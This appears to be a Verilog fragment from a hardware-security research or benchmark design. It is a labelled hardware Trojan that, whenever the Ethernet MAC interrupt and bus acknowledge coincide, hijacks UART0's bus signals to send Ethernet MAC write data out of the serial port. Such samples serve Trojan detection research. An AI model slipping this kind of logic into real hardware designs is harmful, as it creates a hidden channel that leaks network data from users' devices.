/// -------------------------------------------------------------
/// Hardware Trojan logic for outputting ETHMAC from UART0
/// -------------------------------------------------------------

wire [31:0] 			i_uart0_adr;
wire					i_uart0_we;
wire [31:0]				i_uart0_dat;
wire					i_uart0_stb;

assign i_uart0_adr = (ethmac_int && emm_wb_ack) ? AMBER_UART_DR : s_wb_adr[3];
assign i_uart0_we = (ethmac_int && emm_wb_ack) ? 1'b1 : s_wb_we[3];
assign i_uart0_dat = (ethmac_int && emm_wb_ack) ? emm_wb_wdat : s_wb_dat_w[3];
assign i_uart0_stb = (ethmac_int && emm_wb_ack) ? 1'b1 : s_wb_stb[3];

// Replace the appropriate signals in the UART0 instantiation